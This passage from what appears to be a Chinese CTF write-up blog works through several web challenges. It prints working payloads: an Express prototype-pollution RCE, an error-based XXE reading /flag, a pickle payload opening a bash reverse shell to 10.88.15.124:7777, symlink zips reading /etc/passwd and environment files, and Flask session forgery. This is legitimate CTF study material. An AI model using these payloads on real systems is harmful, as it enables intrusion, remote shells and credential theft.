obj.msg = &#x27;upload failed&#x27;;            res.send(JSON.stringify(obj));        &#125; else &#123;            // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if (!fs.existsSync(__dirname + file_path)) &#123;                try &#123;                    fs.mkdirSync(__dirname + file_path)                &#125; catch (error) &#123;                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                &#125;            &#125;            try &#123;                fs.writeFileSync(dir_file, data)                obj = &#123;msg: &#x27;upload success&#x27;, filename: file_path + file_name&#125;            &#125; catch (error) &#123;                obj.msg = &#x27;upload failed&#x27;;            &#125;            res.send(JSON.stringify(obj));        &#125;    &#125;)&#125;)\n\n这个进行文件上传的路由允许POST请求\nvar ip = req.connection.remoteAddress; 这种方式获取客户端 IP 之所以难以通过 HTTP 请求头伪造，是因为它直接从 TCP 连接层 获取 IP 地址，而不是从 HTTP 头部（如 X-Forwarded-For）读取。\nreq.connection.remoteAddress（或 req.socket.remoteAddress）是 Node.js 从 TCP 连接 直接获取的客户端 IP 地址，属于 传输层（OSI 第4层） 的信息，而不是应用层（HTTP 头部）。\n检查完Ip并判断文件合法后就会进行储存和路径拼接，文件通过mime-type进行文件储存，路径直接拼接mime-type\n然后会将路径根据mimetype进行拼接：\nvar file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;\n\n虽然我现在还不知道怎么绕过ip，但是接着看绝对会出现的\n下面是核心路由，通过ssrf来绕过ip\napp.get(&#x27;/core&#x27;, function (req, res) &#123;    var q = req.query.q;//用于获取HTTP请求中查询参数的方式 例：?q=nodejs返回nodejs    var resp = &quot;&quot;;    if (q) &#123;        var url = &#x27;http://localhost:8081/source?&#x27; + q        console.log(url)//变量 url 的值输出到控制台        // 对url字符进行waf        var trigger = blacklist(url);        if (trigger === true) &#123;            res.send(&quot;error occurs!&quot;);        &#125; else &#123;            try &#123;                // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                http.get(url, function (resp) &#123;                    resp.setEncoding(&#x27;utf8&#x27;);                    resp.on(&#x27;error&#x27;, function (err) &#123;                        if (err.code === &quot;ECONNRESET&quot;) &#123;                            console.log(&quot;Timeout occurs&quot;);                        &#125;                    &#125;);                    // 返回结果输出到/core                    resp.on(&#x27;data&#x27;, function (chunk) &#123;                        try &#123;                            resps = chunk.toString();                            res.send(resps);                        &#125; catch (e) &#123;                            res.send(e.message);                        &#125;                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;                        res.send(e.message);//e=error                    &#125;);                &#125;);            &#125; catch (error) &#123;                console.log(error);            &#125;        &#125;    &#125; else &#123;        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);    &#125;&#125;)\n\n我们绕过黑名单后就可以通过\n不行，这个有点难，一时半会看不懂啊\n"},{"title":"[GYCTF2020]Ez_Express","url":"/2025/10/14/GYCTF2020-Ez-Express/","content":"[GYCTF2020]Ez_Express题目是一个登录界面，然后我们可以在页面源代码中看到提示www.zip，下载下来源码，我们直接来看路由\nvar express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123;//原型链污染函数  for (var attr in b) &#123;    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;      merge(a[attr], b[attr]);    &#125; else &#123;      a[attr] = b[attr];    &#125;  &#125;  return a&#125;const clone = (a) =&gt; &#123;  return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123;//过滤函数，防止ADMIN被注册  if(keyword.match(/(admin)/is)) &#123;      return keyword  &#125;  return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123;  if(!req.session.user)&#123;    res.redirect(&#x27;/login&#x27;);  &#125;  res.outputFunctionName=undefined;  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123;  res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123;  if(req.body.Submit==&quot;register&quot;)&#123;   if(safeKeyword(req.body.userid))&#123;//对我们输入的user进行校验，不能为admin    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    req.session.user=&#123;      &#x27;user&#x27;:req.body.userid.toUpperCase(),//获取到我们的user转为大写      &#x27;passwd&#x27;: req.body.pwd,      &#x27;isLogin&#x27;:false    &#125;//写入session    res.redirect(&#x27;/&#x27;); //注册完后跳转  &#125;  else if(req.body.Submit==&quot;login&quot;)&#123;    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;//查询当前session中是否注册过，这里逻辑很无语，就是假如我先进行注册了一个账号，然后再使用另外一个未注册的账号进行登录的时候不会触发这个弹窗    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;//进行校验，校验我们注册的信息和我们输入的信息是否一致      req.session.user.isLogin=true;//一致就登录    &#125;    else&#123;      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)    &#125;    &#125;  res.redirect(&#x27;/&#x27;); ;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123;  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; //这里需要我们注册ADMIN账号，但是admin被过滤了  req.session.user.data = clone(req.body);//如果ADMIN注册成功了，就可以进行原型链污染了  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  &#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;)module.exports = router;\n\n这个首页提示我们一定要使用ADMIN账号进行登录\n\n\n然后看完代码以后，发现这是一个逻辑很奇怪的用户验证系统，我们唯一可以触发action路由中原型链污染的地方竟然是去注册ADMIN，而不是登录\n于是我们就需要先在admin被过滤的情况下进行ADMIN注册，来看代码\nfunction safeKeyword(keyword) &#123;//过滤函数，防止ADMIN被注册  if(keyword.match(/(admin)/is)) &#123;      return keyword  &#125;    safeKeyword(req.body.userid)//也就是我们输入的时候不能输入admin&#x27;user&#x27;:req.body.userid.toUpperCase()//在进行注册的时候会转为大写\n\n对于toUpperCase这种进行大小写转换的函数而且不止普通的英文字母，其他语言或字符有大小写属性的也可以进行转换的函数也是可以进行转换的，就容易发生碰撞，即一个字符的转换结果和其他字符一致，详细的可以看P神文章，php的mb_strtolower也差不多\n也就是可以通过一些其他字符在toUpperCase的执行结果为ADMIN中的某个字符，即可实现在不输入admin的情况下实现ADMIN的注册\n&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            var arr  = new Array();            for(var i = 0;i &lt; 26;i++)&#123;                arr[i] = new Array();            &#125;            for(var i = 0;i &lt; 65536;i++)&#123;                j = String.fromCharCode(i).toUpperCase();                if(j.length == 1)&#123;                    c = j.charCodeAt(0);                    if(c&gt;64&amp;&amp;c&lt;91)&#123;                        l = arr[c-65].length;                        arr[c-65][l] = i;                    &#125;                &#125;            &#125;            for(var i = 0;i &lt; 26;i++)&#123;                document.write(&quot;&lt;p&gt;&quot;+String.fromCharCode(i+65)+&quot;:&lt;/p&gt;&quot;);                document.write(&quot;&lt;p&gt;&quot;);                for(j = 0;j &lt; arr[i].length;j++)&#123;                    document.write(arr[i][j]+&quot;,&quot;);                &#125;                document.write(&quot;&lt;/p&gt;&quot;);            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n结果\nI:73,105,305,S:83,115,383,\n\n也就是说有这些字符经过toUpperCase可以转化为I和S，这里我们使用的是I进行绕过\n\n\n也就是\nadmın  进过转换为ADMIN  注意和admin不一样\n\n然后我们进行注册，用户名为admın，密码任意\n\n\n然后我们对这个输入框进行抓包，发现其指向action路由，可以通过这个输入框进行原型链污染，但是根据代码需要抓包改\n然后就是寻找可以利用的地方了，提示我们flag在/flag，也就是需要命令执行进行读取，但是命令执行结果是没有回显的，如果随便找一个属性就只能无回显RCE，但是这个代码就只有一个可以用的属性\nrouter.get(&#x27;/info&#x27;, function (req, res) &#123;  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;)//render用于模板渲染，index.html data则是传递给index.html的数据在Express中\n\nres.outputFunctionName 是 Express 内部的一个属性，它用于指定响应输出的编码方式。\n问了下DS在res.outputFunctionName被污染时会传递给前端错误的参数，导致user配置出错，响应头混乱，直接提供下载文件outoupFunctionName，大概指的就是这里吧\n\n\n于是我们直接污染res.outoupFunctionName即可\n&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;//是为了注释掉后面的代码\n\n但是为了确保传递参数正确，不会触发400，我们还需要带上原来的参数\n&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;\n\n然后直接进行污染\n\n\n再次访问index.html即可下载flag\n\n\n\n\n","tags":["toUpperCase绕过"]},{"title":"[GoogleCTF2019_Quals]Bnv","url":"/2025/05/14/GoogleCTF2019-Quals-Bnv/","content":"[GoogleCTF2019_Quals]Bnv这是一个比较难的XXE的题目，XXE之前在ctfshow的时候就没怎么写过，现在更是毫无思路，还得从xml开始学\n现在我看得懂xml和dtd了，也该来写这个题目了\n\n\n界面就是一个提交按钮和一个下拉框，上面的被确定是盲文，但是解密出来也没有什么有用的信息\n我们尝试抓包，发现传递了json数据，大佬说传递json数据时会有XXE漏洞，但是我不知道为什么，莫非这就是经验吗\n\n\n我们想要传递xml数据，只需要将content-type改为application&#x2F;xml就行了\n我们之前XXE只写了一两个题目，还停留再直接用DTD读取flag放入实体，然后再写到xml中\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [        &lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;定义了一个外部实体 flag，它指向 /flag 文件。]&gt;&lt;root&gt;    &lt;ctfshow&gt;&amp;flag;&lt;/ctfshow&gt;内部引用flag读取/flag&lt;/root&gt;\n\n但是我们从这次传递的参数和回显来看，这明显不是这么简单的题目\n更像是将我们传递过去的message作为参数去进行一个查询\n我们先使用xml传递message试下\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE message [        &lt;!ELEMENT message (#PCDATA)&gt;    &lt;!ENTITY b &quot;135601360123502401401250&quot;&gt;]&gt;&lt;message&gt;&amp;b;&lt;/message&gt;\n\n\n\n\n\n发现可以正常回显，xml格式可以\nwp里面的操作根本没见过，于是就直接先把payload抄下来分析\npayload\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#x27;&gt;%local_dtd;]&gt;//因为我们要的是报错嘛，后面的文档部分有没有无所谓了\n\n先是定义了一个参数实体，又在最后面加载出来了。这包含的是一个Linux系统中自带的一个dtd文件\nLinux系统可能在/usr/share/yelp/dtd/docbookx.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。\n&amp;#x25;这个是%的预定义实体x25则是16进制，由于%在DTD中输入特殊字符，所以需要预定义实体来让其转义\n那么把payload给认识完了，就可以开始分析payload了\n我们先看eval的内容\n&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;\n\n这里面x26是&amp;，x27则是’，于是就变成了\n&lt;!ENTITY &amp;% eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;\n\n然后在后面进行实体化的时候就会变成\n&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;\n\n会被编译器重新解析，&amp;#x26;#x25;会先解析前面的预定义为&amp;#x25然后再解析为%\n&lt;!ENTITY % error SYSTEM &#x27;file:///aaaaa/%file;&#x27;&gt;\n\n这个时候发现已经定义的实体file为&#x2F;flag的内容，这时候就印证了为什么特殊字符需要用预处理实体了，由于引号中也可以带有实体，所以%file为实体而非字符串\n如果我们尝试引用系统不存在的文件，会报错：\nfailed to load external entity “file:///xxxx”, line 6, column 10\n\n我们正是利用这个特性，在后面再对%error进行调用，在读取file:///aaaaa/%file的时候会报错的同时输出url(这里面的%file实际上是&#x2F;flag)\n\n\n\n\n这个题目在无法进行文件读取的情况下，使用DTD的参数实体，使其在解析DTE文档的时候进行文件读取然后利用文件不存在报错带出flag\n"},{"title":"[HFCTF_2021_Final]easyflask","url":"/2025/09/09/HFCTF-2021-Final-easyflask/","content":"[HFCTF_2021_Final]easyflask根据题目提示直接访问得到源码\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler():    if not session.get(&#x27;u&#x27;):        u = pickle.dumps(User())        session[&#x27;u&#x27;] = u    return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler():    path = request.args.get(&#x27;file&#x27;)    path = os.path.join(&#x27;static&#x27;, path)    if not os.path.exists(path) or os.path.isdir(path) \\            or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path:        return &#x27;disallowed&#x27;    with open(path, &#x27;r&#x27;) as fp:        content = fp.read()    return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)\n\n可以看到这是一个flask的session伪造题目，在/file路由下虽然做了过滤但是和没有一样可以直接访问文件，可以访问配置文件拿到密匙。\n有一点需要注意的是这个虽然也是flask的session但是直接使用我们之前以base64解码为主的不一样，我们需要使用pickle去读取数据将其反序列化\nimport pickleimport base64 a = pickle.loads(base64.b64decode(b&#x27;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAMmE0MDIxOTA4NmI0YTk1MDNkYWNkNjc1OTRlODg1NjhxBXUu&#x27;))print(a)\n\n我们可以通过后面是否携带密钥签名来判断是flask_session还是单纯的pickle序列化数据\n但是为什么我看admin路由这么奇怪呢，在判断内容之前就进行了pickle反序列化然后就执行命令也就是判读好像没意义了。\n我们访问/file?file=/proc/self/environ读取密钥\nglzjin22948575858jfjfjufirijidjitg3uiiuuh\n\n然后准备反序列化数据\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64encodeUser = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 1,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (os.system,(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.88.15.124/7777 0&gt;&amp;1&#x27;&quot;,))&#125;)u = pickle.dumps(User())print(b64encode(u).decode())\n\n创建了一个User类然后和题目相比多了一个__reduce__方法用于返回一个元组进行命令执行，__reduce__这个魔术方法在进行反序列化的时候会执行，感觉好方便\n我们直接反弹shell，但是需要注意的是Python3和2的数据不一样这个服务器是python2的我们也要使用Python2，而且需要在Linux系统中运行，这两个环境下dumps的结果中序列化字符串声明系统的标识符不同：Linux&#x3D;&gt;posix；Windows&#x3D;&gt;nt，需要将脚本放在Linux环境下生成序列化字符串。\n然后使用session伪造脚本进行反弹shell\npython flask_session_cookie_manager3.py encode -s &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot; -t &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjg4LjE1LjExMi83Nzc3IDA+JjEnIgpwMQp0cDIKUnAzCi4=&#x27;&#125;&#125;&quot;\n\n使用bp抓包然后改session\n\n\n经过测试，即使is_admin=0也可以进行命令执行\n\n","tags":["/proc/self/environ读取env","Flask_session伪造"]},{"title":"[HCTF_2018]Hideandseek","url":"/2025/06/11/HCTF-2018-Hideandseek/","content":"[HCTF_2018]Hideandseek进入靶场是一个登录界面，尝试了一下除了admin，随便输什么都可以登录。那就和sql注入不沾边了。\n登录进去是一个文件上传界面，叫我们上传zip文件可以获得更多秘密\n\n\n随便上传一个带shell的zip\n\n\n我们发现这个似乎被解析了shell都不见了，但是这个路径又有点不对，之前是zip是通过文件包含写shell，但是这个路径不明白，只能看题解了。\n题解说这题使用的是解压zip文件后触发软链接，从而实现读取文件。\n我认为软链接就相当于windows中的快捷方式，只不过是类似txt类型的文件，触发软链接会读取目标路径的文件\n我们先尝试读取&#x2F;etc&#x2F;passwd\nln -s /etc/passwd passwd #在当前页面生成软链接passwd指向/etc/passwdzip -y passwd.zip passwd #将软链接passwd压缩为passwd.zip\n\n\n\n我们读取&#x2F;proc&#x2F;self&#x2F;environ来查看环境变量发现\nln -s /proc/self/environ enzip -y en.zip en\n\n这是 uWSGI 服务器，我们等下直接尝试读取&#x2F;app&#x2F;uwsgi.ini\n\n\n\n\n在 Flask 网站部署中，/app/uwsgi.ini 是一个 uWSGI 服务器的配置文件，用于定义如何运行 Flask 应用\n\n\n\n配置项\n作用\n\n\n\nsocket\n定义uWSGI与Web服务器（如Nginx）通信的接口（端口或Unix socket）\n\n\nchdir\n设置应用根目录（Flask代码存放路径）\n\n\nwsgi-file\n指定Flask主程序文件（如 app.py）\n\n\ncallable\n定义Flask实例的变量名（默认为 app，对应代码中的 app = Flask(__name__)）\n\n\nprocesses\n工作进程数（影响并发能力）\n\n\nthreads\n每个进程的线程数\n\n\nlogto\n日志输出路径（调试时重要）\n\n\n于是我们可以通过uwsgi.ini去拿到主程序文件去读取源代码\n读取/app/uwsgi.ini\nln -s /app/uwsgi.ini uszip -y us.zip us\n\n拿到回显\n[uwsgi] module = main callable=app logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log\n\n这里指向main.py，但实际上不是的\nln -s /app/main.py mainzip -y main.zip main\n\n\n\n\n\n后来看了大佬的博客，可能是buuoj的环境有点问题， &#x2F;app&#x2F;uwsgi.ini回显中应该是module&#x3D;&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py，读取&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py即可得到源文件\n# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*100)app.config[&#x27;UPLOAD_FOLDER&#x27;] = &#x27;./uploads&#x27;app.config[&#x27;MAX_CONTENT_LENGTH&#x27;] = 100 * 1024ALLOWED_EXTENSIONS = set([&#x27;zip&#x27;])def allowed_file(filename):    return &#x27;.&#x27; in filename and \\           filename.rsplit(&#x27;.&#x27;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index():    error = request.args.get(&#x27;error&#x27;, &#x27;&#x27;)    if(error == &#x27;1&#x27;):        session.pop(&#x27;username&#x27;, None)        return render_template(&#x27;index.html&#x27;, forbidden=1)    if &#x27;username&#x27; in session:        return render_template(&#x27;index.html&#x27;, user=session[&#x27;username&#x27;], flag=flag.flag)    else:        return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login():    username=request.form[&#x27;username&#x27;]    password=request.form[&#x27;password&#x27;]    if request.method == &#x27;POST&#x27; and username != &#x27;&#x27; and password != &#x27;&#x27;:        if(username == &#x27;admin&#x27;):            return redirect(url_for(&#x27;index&#x27;,error=1))        session[&#x27;username&#x27;] = username    return redirect(url_for(&#x27;index&#x27;))@app.route(&#x27;/logout&#x27;, methods=[&#x27;GET&#x27;])def logout():    session.pop(&#x27;username&#x27;, None)    return redirect(url_for(&#x27;index&#x27;))@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])def upload_file():    if &#x27;the_file&#x27; not in request.files:        return redirect(url_for(&#x27;index&#x27;))    file = request.files[&#x27;the_file&#x27;]    if file.filename == &#x27;&#x27;:        return redirect(url_for(&#x27;index&#x27;))    if file and allowed_file(file.filename):        filename = secure_filename(file.filename)        file_save_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], filename)        if(os.path.exists(file_save_path)):            return &#x27;This file already exists&#x27;        file.save(file_save_path)    else:        return &#x27;This file is not a zipfile&#x27;    try:        extract_path = file_save_path + &#x27;_&#x27;        os.system(&#x27;unzip -n &#x27; + file_save_path + &#x27; -d &#x27;+ extract_path)        read_obj = os.popen(&#x27;cat &#x27; + extract_path + &#x27;/*&#x27;)        file = read_obj.read()        read_obj.close()        os.system(&#x27;rm -rf &#x27; + extract_path)    except Exception as e:        file = None    os.remove(file_save_path)    if(file != None):        if(file.find(base64.b64decode(&#x27;aGN0Zg==&#x27;).decode(&#x27;utf-8&#x27;)) != -1):            return redirect(url_for(&#x27;index&#x27;, error=1))    return Response(file)if __name__ == &#x27;__main__&#x27;:    #app.run(debug=True)    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=10008)\n\n看完后有点看不懂，但是我们只需要注意\nrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*100)\n\n密钥是由伪随机数组成的，我们只需要获得种子就能伪造session，我们先对我们自己的session进行解码\n&#123;&quot;username&quot;:&quot;111&quot;&#125;\n\n\n\n接下来就只需要种子了\n在Python中，uuid.getnode() 函数返回 当前计算机网络接口的MAC地址（以48位整数形式表示），常被用作生成UUID或伪随机数的种子\n于是我们只需要读取mac地址即可\nln -s /sys/class/net/eth0/address maczip -y mac.zip mac\n\n拿到\nb6:e3:67:c0:5f:7b\n\n我们再拿大佬的脚本来进行转换\nimport uuidimport randommac = &quot;b6:e3:67:c0:5f:7b&quot;temp = mac.split(&#x27;:&#x27;)temp = [int(i,16) for i in temp]temp = [bin(i).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in temp]temp = &#x27;&#x27;.join(temp)mac = int(temp,2)print(mac)#将mac转为十进制random.seed(mac)print(random.random()*100)#201087814492027#38.629052842542286\n\n我们直接进行session伪造\npython flask_session_cookie_manager3.py encode -s &quot;38.629052842542286&quot; -t &quot;&#123;&#x27;username&#x27;:&#x27;admin&#x27;&#125;&quot;\n\n\n\n\n\n\n\n\n"},{"title":"[HFCTF2020]BabyUpload","url":"/2025/05/09/HFCTF2020-BabyUpload/","content":"[HFCTF2020]BabyUpload简直了，babyupload和文件上传已经远离了，题目直接给出了源码\n&lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;//包含flaghighlight_file(__FILE__);if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)&#123;    $filename=&#x27;/var/babyctf/success.txt&#x27;;    if(file_exists($filename))&#123;            safe_delete($filename);            die($flag);    &#125;&#125;else&#123;    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;&#125;$direction = filter_input(INPUT_POST, &#x27;direction&#x27;);$attr = filter_input(INPUT_POST, &#x27;attr&#x27;);//获取POST传参 进行赋值$dir_path = &quot;/var/babyctf/&quot;.$attr;//连接路径if($attr===&quot;private&quot;)&#123;    $dir_path .= &quot;/&quot;.$_SESSION[&#x27;username&#x27;];&#125;if($direction === &quot;upload&quot;)&#123;    //当direction为upload时上传文件    try&#123;        if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123;            throw new RuntimeException(&#x27;invalid upload&#x27;);        &#125;//检查上传文件是否为正常文件        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;];        //加了一个attr后面还要加filename，我们后面需要让attr为空才能上传到指定路径        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]);        if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123;            //进行过滤，禁止了目录跨越            throw new RuntimeException(&#x27;invalid file path&#x27;);        &#125;        @mkdir($dir_path, 0700, TRUE);        //创建目录        if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123;//使用move_uploaded_file进行文件移动            $upload_result = &quot;uploaded&quot;;        &#125;else&#123;            throw new RuntimeException(&#x27;error while saving&#x27;);        &#125;    &#125; catch (RuntimeException $e) &#123;        $upload_result = $e-&gt;getMessage();    &#125;&#125; elseif ($direction === &quot;download&quot;) &#123;    //当direction为download时为读取文件    try&#123;        $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;));        $file_path = $dir_path.&quot;/&quot;.$filename;        //读取文件路径后面添加filename        if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123;            throw new RuntimeException(&#x27;invalid file path&#x27;);        &#125;        if(!file_exists($file_path)) &#123;            throw new RuntimeException(&#x27;file not exist&#x27;);        &#125;        header(&#x27;Content-Type: application/force-download&#x27;);        header(&#x27;Content-Length: &#x27;.filesize($file_path));        header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;);        if(readfile($file_path))&#123;            //使用readfile读取文件            $download_result = &quot;downloaded&quot;;        &#125;else&#123;            throw new RuntimeException(&#x27;error while saving&#x27;);        &#125;    &#125; catch (RuntimeException $e) &#123;        $download_result = $e-&gt;getMessage();    &#125;    exit;&#125;?&gt;\n\n只能说短的代码我不会，长的代码看不懂，这下废了\n我们可以看见flag，直接来看他的输出条件\nif($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)//需要$_SESSION[&#x27;username&#x27;]=&#x27;admin&#x27;&#123;    $filename=&#x27;/var/babyctf/success.txt&#x27;;    if(file_exists($filename))&#123;        //需要filename提供的路径存在，我们要上传的文件就是这个success.txt            safe_delete($filename);            die($flag);    &#125;&#125;else&#123;    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;//如果username不是admin，就会变成guest&#125;\n\n但是，我们根本不知道该如何文件上传，因为这个题目，连上传框都没有\n我们看完代码之发现了\nsession_save_path(&quot;/var/babyctf/&quot;);session_start();//将SESSION保存在这个路径下\n\nphp的session默认存储文件名是sess_+PHPSESSID的值，我们先看一下session文件内容。查看cookie中PHPSESSID\n\n\n我们想要伪造SESSION，必须先读取到原来的SESSION，\n我们利用directon&#x3D;download时进行文件读取\nelseif ($direction === &quot;download&quot;) &#123;    //当direction为download时为读取文件    try&#123;        $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;));        $file_path = $dir_path.&quot;/&quot;.$filename;        //读取文件路径后面添加filename        if(preg_match(&#x27;/(\\.\\.\\/|\\.\\.\\\\\\\\)/&#x27;, $file_path))&#123;            throw new RuntimeException(&#x27;invalid file path&#x27;);        &#125;        if(!file_exists($file_path)) &#123;            throw new RuntimeException(&#x27;file not exist&#x27;);        &#125;        header(&#x27;Content-Type: application/force-download&#x27;);        header(&#x27;Content-Length: &#x27;.filesize($file_path));        header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;);        